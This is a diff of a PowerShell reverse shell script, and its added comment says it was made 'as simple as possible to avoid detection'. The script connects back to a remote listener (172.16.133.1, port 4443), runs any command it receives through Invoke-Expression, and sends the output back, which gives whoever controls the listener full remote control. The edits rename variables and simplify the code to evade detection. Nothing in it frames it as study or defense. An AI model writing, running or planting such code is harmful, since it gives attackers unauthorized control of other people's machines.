@@ -1,33 +1,30 @@
-$ip = '172.16.8.1'
+# A simple reverse shell script. No fancy features, no AMSI bypass. I made it as simple as possible to avoid detection.
+$ip = '172.16.133.1'
 $port = 4443
 
-$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
-$stream = $client.GetStream()
-$writer = New-Object System.IO.StreamWriter($stream)
-$reader = New-Object System.IO.StreamReader($stream)
-$writer.AutoFlush = $true
+$c = New-Object System.Net.Sockets.TCPClient($ip, $port)
+$s = $c.GetStream()
+$w = New-Object System.IO.StreamWriter($s, [System.Text.Encoding]::UTF8)
+$r = New-Object System.IO.StreamReader($s)
+$w.AutoFlush = $true
 
-function Execute-Command {
-    param (
-        [string]$cmd
-    )
+function _psexec($cmd) {
     try {
-        $result = Invoke-Expression $cmd 2>&1 | Out-String
+        return iex $cmd 2>&1 | Out-String
     } catch {
-        $result = $_.Exception.Message
+        return $_.Exception.Message
     }
-    return $result
 }
 
-while ($client.Connected) {
-    $currentDir = (Get-Location).Path
-    $writer.Write("PS $currentDir> ")
-    $cmd = $reader.ReadLine()
+while ($c.Connected) {
+    $prompt = "[$pid] PS $pwd > "
+    $w.Write($prompt)
+    $cmd = $r.ReadLine()
     if ($cmd -eq 'exit') { break }
-    $result = Execute-Command -cmd $cmd
-    $writer.WriteLine($result)
+    $result = _psexec($cmd)
+    $w.WriteLine($result)
 }
 
-$writer.Close()
-$reader.Close()
-$client.Close()
+$w.Close()
+$r.Close()
+$c.Close()
